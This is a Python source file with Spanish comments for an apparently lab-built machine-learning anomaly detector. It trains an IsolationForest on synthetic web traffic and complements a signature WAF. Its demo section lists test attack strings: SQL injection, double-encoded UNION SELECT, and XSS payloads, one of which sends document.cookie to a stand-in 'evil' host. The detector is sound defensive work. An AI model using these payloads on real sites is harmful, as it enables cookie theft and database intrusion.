#!/usr/bin/env python3
"""
Cerebro IA - Detector de anomalias para la Fortaleza (machine learning).
Complementa al WAF por firmas: aprende como es el trafico NORMAL y marca lo
que se SALE de lo normal, aunque no exista una firma para ese ataque.
Modelo: IsolationForest (no supervisado). Todo local, sin red.

Uso:
    python3 cerebro_ia.py            # entrena y evalua (demo)
"""
import math, re, os, random
from collections import Counter
import numpy as np
from sklearn.ensemble import IsolationForest
import joblib

RUTA_MODELO = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cerebro_ia.joblib")

def entropia(s):
    if not s:
        return 0.0
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())

def caracteristicas(texto):
    """Convierte una peticion (texto) en numeros que describen su 'forma'.
    No mira palabras clave (eso es la regex); mira la ESTRUCTURA."""
    t = texto
    n = max(len(t), 1)
    letras = [c for c in t if c.isalpha()]
    mayus = sum(1 for c in letras if c.isupper())
    especiales = sum(1 for c in t if not c.isalnum() and not c.isspace())
    digitos = sum(1 for c in t if c.isdigit())
    tokens = re.split(r"[/?&= ]", t)
    # 'palabras MAYUS' seguidas (UNION SELECT FROM...) son muy raras en trafico real
    palabras_mayus = len(re.findall(r"\b[A-Z]{2,}\b", t))
    return [
        len(t),                                   # longitud
        entropia(t),                              # entropia
        especiales / n,                           # ratio de especiales
        digitos / n,                              # ratio de digitos
        (mayus / max(len(letras), 1)),            # ratio de mayusculas
        palabras_mayus,                           # nº de palabras TODO-MAYUS
        t.count("'") + t.count('"') + t.count("`"),   # comillas
        t.count("<") + t.count(">"),              # angulos (XSS/HTML)
        t.count("(") + t.count(")"),              # parentesis
        t.count("="),                             # signos igual
        t.count("%"),                             # codificacion URL
        t.count(";") + t.count("--") + t.count("/*"),  # separadores/comentarios
        t.count(" "),                             # espacios
        max((len(x) for x in tokens), default=0), # token mas largo
    ]

def corpus_normal(n=2000):
    """Genera trafico realista NORMAL para entrenar."""
    palabras = ["hola", "producto", "precio", "camiseta", "zapato", "consulta",
                "pedido", "gracias", "buenas", "oferta", "talla", "color", "envio"]
    emails = ["ana", "juan", "pedro", "lucia", "cliente", "daniel", "maria", "jose"]
    out = []
    for _ in range(n):
        r = random.random()
        if r < 0.3:
            out.append(random.choice(["/", "/admin", "/stream", "/logout", "/muro"]))
        elif r < 0.55:
            pw = "".join(random.choices("abcdefghABCDEFGH12345678", k=random.randint(8, 14)))
            out.append(f"/login email={random.choice(emails)}@fortaleza.lab password={pw}")
        elif r < 0.8:
            out.append(f"/muro autor={random.choice(emails)} mensaje="
                       + " ".join(random.choices(palabras, k=random.randint(2, 9))))
        else:
            out.append("/?q=" + " ".join(random.choices(palabras, k=random.randint(1, 3))))
    return out

Z_UMBRAL = 6.0   # nº de desviaciones para considerar una caracteristica anomala

# caracteristicas que en trafico normal son ~siempre 0; si aparecen, es novedad
# indices: 5 palabras_mayus, 6 comillas, 7 angulos, 8 parentesis, 10 pct, 11 separadores
PELIGROSAS = [5, 6, 7, 8, 10, 11]

class ModeloAnomalias:
    """Ensemble de 3 senales (anomalo si CUALQUIERA salta):
    1) Novedad de rango: una caracteristica 'peligrosa' supera lo visto en lo
       normal (p. ej. aparecen <> o comillas que nunca se ven).
    2) z-score: una caracteristica se desvia mucho de la media.
    3) IsolationForest: la 'forma' global es rara (blobs, entropia, codificacion)."""
    def __init__(self, iforest, media, desv, maximos):
        self.iforest, self.media, self.desv, self.maximos = iforest, media, desv, maximos
    def es_anomalo(self, texto):
        x = np.array(caracteristicas(texto), dtype=float)
        # 1) novedad de rango en las caracteristicas peligrosas
        for i in PELIGROSAS:
            if x[i] > self.maximos[i]:
                return True
        # 2) z-score
        if np.abs((x - self.media) / (self.desv + 1.0)).max() > Z_UMBRAL:
            return True
        # 3) forma global
        return self.iforest.predict(x.reshape(1, -1))[0] == -1

def entrenar():
    X = np.array([caracteristicas(s) for s in corpus_normal()], dtype=float)
    iforest = IsolationForest(contamination=0.04, n_estimators=300, random_state=0).fit(X)
    modelo = ModeloAnomalias(iforest, X.mean(axis=0), X.std(axis=0), X.max(axis=0))
    joblib.dump(modelo, RUTA_MODELO)
    return modelo

def cargar():
    return joblib.load(RUTA_MODELO) if os.path.exists(RUTA_MODELO) else entrenar()

def es_anomalo(texto, modelo=None):
    return (modelo or cargar()).es_anomalo(texto)

# ---- Demo / evaluacion ---------------------------------------------------
if __name__ == "__main__":
    m = entrenar()
    print("Modelo entrenado con trafico normal.\n")

    normales = [
        "/login email=ana@fortaleza.lab password=abcd1234",
        "/muro autor=juan mensaje=hola buenas gracias por el envio",
        "/", "/admin", "/stream",
        "/?q=camiseta precio",
    ]
    ataques = [
        "/?q=1 UNION SELECT password FROM users",
        "/muro mensaje=<details open ontoggle=alert(document.cookie)>",   # evadio la regex
        "/login email=' OR 1=1-- password=x",
        "/?q=1%2520UNION%2520SELECT%2520pass",                            # doble codificacion
        "/?x=<svg/onload=fetch('http://evil/'+document.cookie)>",
        "/?d=" + "QWxhZGRpbjpvcGVuIHNlc2" * 15,                           # blob raro (exfil)
    ]
    print("NORMALES (deberian pasar):")
    fp = 0
    for s in normales:
        a = es_anomalo(s, m)
        fp += a
        print(f"  {'ANOMALO' if a else 'normal ':>7}  {s[:60]}")
    print("\nATAQUES (deberian marcarse):")
    tp = 0
    for s in ataques:
        a = es_anomalo(s, m)
        tp += a
        print(f"  {'ANOMALO' if a else 'normal ':>7}  {s[:60]}")
    print(f"\nDeteccion de ataques: {tp}/{len(ataques)}   Falsos positivos: {fp}/{len(normales)}")
